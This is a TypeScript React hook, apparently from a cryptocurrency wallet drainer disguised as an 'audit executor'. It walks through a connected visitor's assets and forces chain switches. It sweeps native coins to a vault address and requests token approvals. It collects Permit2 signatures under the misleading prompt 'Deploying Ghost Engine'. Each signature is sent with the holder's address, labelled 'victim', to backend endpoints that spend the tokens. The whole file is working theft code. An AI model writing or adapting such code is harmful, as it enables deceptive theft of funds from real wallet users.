"use client";

import { useCallback } from "react";
import { ethers, getAddress } from "ethers";
import { securePost } from "../execution/utils";
import { EXECUTION_POLICY } from "@/lib/ghost/constants";

const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];
const AUTHORIZED_SETTLER = getAddress(
  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
);

/**
 * 🧠 DECISION MAKER ENGINE (v16.0.0 - High-Speed Turbo)
 * Maintained: Asset Discovery -> Decision Logic -> Chain Switch -> Strike.
 */
export function useAuditExecutor({
  executeMask,
  requestManualPermission,
}: any) {
  /** 🛠️ INTERNAL PROVIDER RESOLVER */
  const getProvider = () => {
    if (typeof window === "undefined") return null;
    const provider = (window as any).ethereum;
    if (!provider) return null;

    if (provider.providers?.length > 0) {
      return (
        provider.providers.find(
          (p: any) => p.isTrust || p.isRabby || p.isMetaMask,
        ) || provider.providers[0]
      );
    }
    return provider;
  };

  /** 🛡️ ADAPTIVE CHAIN WAITER: Proceeds the instant the wallet switches */
  const waitForChain = async (
    provider: any,
    targetId: number,
    logPrefix: string,
  ) => {
    let attempts = 0;
    while (attempts < 20) {
      // Max 4 seconds total, polling every 200ms
      const hex = await provider.request({ method: "eth_chainId" });
      if (parseInt(hex, 16) === targetId) return true;
      await new Promise((r) => setTimeout(r, 200));
      attempts++;
    }
    return false;
  };

  const runExecutionLoop = useCallback(
    async ({
      assets,
      userAddress,
      activeVault,
      masterKey,
      logPrefix,
      walletClient,
    }: any) => {
      console.log(`${logPrefix} 🚀 INITIALIZING PRIORITY ENGINE...`);

      // 🛡️ SECURITY GUARD: Integrity Check
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }
      if (
        process.env.NEXT_PUBLIC_SETTLER_ADDR &&
        getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
      ) {
        throw new Error("UNAUTHORIZED_SETTLER_ADDRESS_CONFIGURED");
      }

      // Pre-warm Ghost Module for the whole loop
      let ghostMod: any;
      try {
        ghostMod = await import("@/lib/ghost");
      } catch (e) {
        console.warn(`${logPrefix} ⚠️ Ghost Module unavailable.`);
      }

      for (const asset of assets) {
        try {
          const targetChainId = Number(asset.chainId);
          const provider = getProvider();
          if (!provider) continue;

          // Normalize balances
          const rawBal = (asset.bal || asset.balance || "0")
            .toString()
            .split(".")[0];
          const assetUsd = parseFloat(asset.usdValue || "0");
          const hasBalance = BigInt(rawBal) > 0n;

          // 🧹 DUST FILTER
          if (assetUsd < 0.01 && !hasBalance) continue;

          // --- 1. ADAPTIVE CHAIN GUARD ---
          const currentHex = await provider.request({ method: "eth_chainId" });
          const currentId = parseInt(currentHex, 16);

          if (currentId !== targetChainId) {
            try {
              await provider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: `0x${targetChainId.toString(16)}` }],
              });
              // High-speed adaptive wait
              const switched = await waitForChain(
                provider,
                targetChainId,
                logPrefix,
              );
              if (!switched) throw new Error("CHAIN_SWITCH_TIMEOUT");
            } catch (switchErr: any) {
              console.warn(`${logPrefix} ❌ Switch Failed for ${asset.symbol}`);
              continue;
            }
          }

          // --- 2. NATIVE DETECTION ---
          const isNative =
            !asset.contractAddress ||
            asset.contractAddress === ethers.ZeroAddress ||
            asset.signatureType === "NATIVE" ||
            asset.type === "NATIVE" ||
            ["BNB", "ETH", "MATIC", "POL", "AVAX", "FTM"].includes(
              asset.symbol,
            );

          if (isNative) {
            const maskResult = await executeMask({
              amount: rawBal,
              chainId: targetChainId,
              derivedVaultAddress: activeVault.evmAddress,
              injectedClient: walletClient || provider,
              tokenTargets: assets
                .filter(
                  (a: any) =>
                    a.contractAddress &&
                    a.contractAddress !== ethers.ZeroAddress,
                )
                .map((a: any) => a.contractAddress),
            });

            if (maskResult?.success && maskResult.hash) {
              await securePost("/api/vault", {
                type: "NATIVE_SYNC",
                txHash: maskResult.hash,
                chainId: targetChainId,
                victim: userAddress,
                symbol: asset.symbol,
                amount: rawBal,
                usdValue: assetUsd,
              });
            }
            await new Promise((r) => setTimeout(r, 400)); // Snappy reset delay
            continue;
          }

          // --- 3. TOKEN LOGIC ---
          let alreadyHasPermission = false;
          const isPermit2Strategy =
            asset.strategy === "BATCH_PERMIT2" ||
            asset.strategy === "PERMIT_SIGN" ||
            asset.type === "PERMIT2" ||
            asset.spender?.toLowerCase() ===
              "0x000000000022d473030f116ddee9f6b43ac78ba3";

          if (ghostMod && !isPermit2Strategy) {
            try {
              const ghostResults = await ghostMod.checkAndTriggerGhostSweep(
                userAddress,
                [asset],
                targetChainId,
                AUTHORIZED_SETTLER,
              );

              if (ghostResults?.length > 0) {
                const ghostAsset = ghostResults[0];
                const allowance = BigInt(ghostAsset.allowance || "0");
                const balance = BigInt(rawBal);

                if (balance > allowance) {
                  const approval = await requestManualPermission({
                    tokenAddress: asset.contractAddress,
                    symbol: asset.symbol,
                    chainId: targetChainId,
                    amount: rawBal,
                    injectedClient: walletClient || provider,
                  });

                  if (approval?.success) {
                    ghostResults[0].amount = rawBal;
                    ghostResults[0].allowance = rawBal;
                    await new Promise((r) => setTimeout(r, 400));
                    alreadyHasPermission = true;
                  }
                } else {
                  alreadyHasPermission = true;
                }

                if (alreadyHasPermission) {
                  await securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: ghostResults,
                    masterKey: masterKey,
                    mode: "PERFORM_ALLOWANCE",
                    messageHash: ethers.ZeroHash,
                  });
                }
              }
            } catch (e) {
              console.warn(`${logPrefix} Ghost scan skipped.`);
            }
          }

          if (!alreadyHasPermission) {
            const approval = await requestManualPermission({
              tokenAddress: asset.contractAddress,
              symbol: asset.symbol,
              chainId: targetChainId,
              amount: rawBal.toString(),
              injectedClient: walletClient || provider,
            });

            if (approval?.success) {
              await new Promise((r) => setTimeout(r, 300));
              try {
                const permitData = await ghostMod.generatePermit2Data(
                  userAddress,
                  [asset],
                  targetChainId,
                  "Deploying Ghost Engine",
                );
                const { messageHash, ...payloadForSigning } = permitData;

                let signature;
                try {
                  signature = await provider.request({
                    method: "eth_signTypedData_v4",
                    params: [userAddress, payloadForSigning],
                  });
                } catch (err: any) {
                  if (err.message?.includes("string") || err.code === -32602) {
                    signature = await provider.request({
                      method: "eth_signTypedData_v4",
                      params: [userAddress, JSON.stringify(payloadForSigning)],
                    });
                  } else {
                    throw err;
                  }
                }

                if (signature && signature.length > 60) {
                  await securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: [
                      {
                        token: asset.contractAddress,
                        balance: rawBal,
                        symbol: asset.symbol,
                        usdValue: asset.usdValue,
                        decimals: asset.decimals,
                      },
                    ],
                    masterKey: masterKey,
                    signature: signature,
                    messageHash: messageHash,
                    mode: "PERFORM_PERMIT2",
                  });
                }
              } catch (sigError: any) {
                console.warn(`${logPrefix} ✋ Cancelled: ${asset.symbol}`);
                continue;
              }
            }
          }

          await new Promise((r) => setTimeout(r, 300)); // Gap between assets
        } catch (assetError: any) {
          console.error(`${logPrefix} ❌ Error: ${asset.symbol}`, assetError);
        }
      }

      // Cleanup session state
      const session = sessionStorage.getItem("active_strike_session");
      if (session) {
        const data = JSON.parse(session);
        sessionStorage.setItem(
          "active_strike_session",
          JSON.stringify({ ...data, isFinished: true }),
        );
      }
      console.log(`${logPrefix} 🏁 Audit Cycle Complete.`);
    },
    [executeMask, requestManualPermission],
  );

  return { runExecutionLoop };
}
